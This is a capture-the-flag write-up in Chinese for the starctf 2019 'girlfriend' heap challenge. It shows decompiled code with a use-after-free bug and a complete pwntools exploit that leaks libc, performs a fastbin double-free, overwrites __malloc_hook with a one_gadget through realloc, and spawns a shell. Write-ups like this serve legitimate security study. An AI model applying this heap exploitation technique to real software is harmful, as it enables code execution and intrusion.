# starctf_2019_girlfriend
https://www.cnblogs.com/LynneHuan/p/15229729.html
## 总结
常规的`fastbin attack`，劫持`__malloc_hook`为`realloc+2`，然后`__realloc_hook`为`one_gadget`即可

## 题目分析
### checksec
```
[*] '/root/AutoExpMarkDocker/data/nolabel/starctf_2019_girlfriend'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

题目环境为`ubuntu-16.04`

### 函数分析
恢复下`girlfriend`的结构体：
```c
struct Girl
{
  char *name_ptr;
  _DWORD size;
  char phone[12];
};
```
漏洞点在`call_girlfriend`的时候的`UAF`:

```c
unsigned __int64 call()
{
  unsigned int v0; // eax
  int idx; // [rsp+0h] [rbp-10h]
  int v3; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("Be brave,speak out your love!");
  puts(&byte_11DE);
  puts("Please input the index:");
  __isoc99_scanf("%d", &idx);
  if ( idx < 0 || idx > 0x63 )
    exit(0);
  if ( girls_array[idx] )
    free(girls_array[idx]->name_ptr);                // uaf
  v0 = time(0LL);
  srand(v0);
  v3 = rand() % 10;
  if ( v3 > 1 )
    puts("Oh, you have been refused.");
  else
    puts("Now she is your girl friend!");
  puts("Done!");
  return __readfsqword(0x28u) ^ v4;
}
```

## exp
```python
from pwncli import *

cli_script()

p = gift['io']
elf = gift['elf']
if gift['debug']:
    gadget = 0xf1207
    libc = gift['libc']
else:
    gadget = 0xf1147
    libc = ELF("./libc-2.23.so")


def add(size, name="a",phone="b"):
    p.sendlineafter("Input your choice:", "1")
    p.sendlineafter("Please input the size of girl's name\n", str(size))
    p.sendafter("please inpute her name:\n", name)
    p.sendafter("please input her call:\n", phone)


def show(idx):
    p.sendlineafter("Input your choice:", "2")
    p.sendlineafter("Please input the index:\n", str(idx))
    p.recvuntil("name:\n")
    name = p.recvline()
    p.recvuntil("phone:\n")
    phone = p.recvline()
    info("recv name:{}  phone:{}".format(name, phone))
    return name, phone


def call(idx):
    p.sendlineafter("Input your choice:", "4")
    p.sendlineafter("Please input the index:\n", str(idx))


# fastbin attack
# leak libc addr to get malloc addr
# use one_gadget to get shell

add(0x80)
add(0x60)
add(0x60)

call(0)
name, _= show(0)
leak_libc_addr = u64(name[:-1].ljust(8, b"\x00"))
log_address("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - 0x3c4b78
log_address("libc_base_addr", libc_base_addr)

libc.address = libc_base_addr

call(1)
call(2)
call(1)

add(0x60, p64(libc.sym["__malloc_hook"] - 0x23))
add(0x60)
add(0x60)

# 0x45226 0x4527a 0xf0364 0xf1207

payload = flat(["a" * 11, libc_base_addr + gadget, libc.sym['realloc']+2])

add(0x60, payload)

p.sendlineafter("Input your choice:", "1")

p.interactive()
```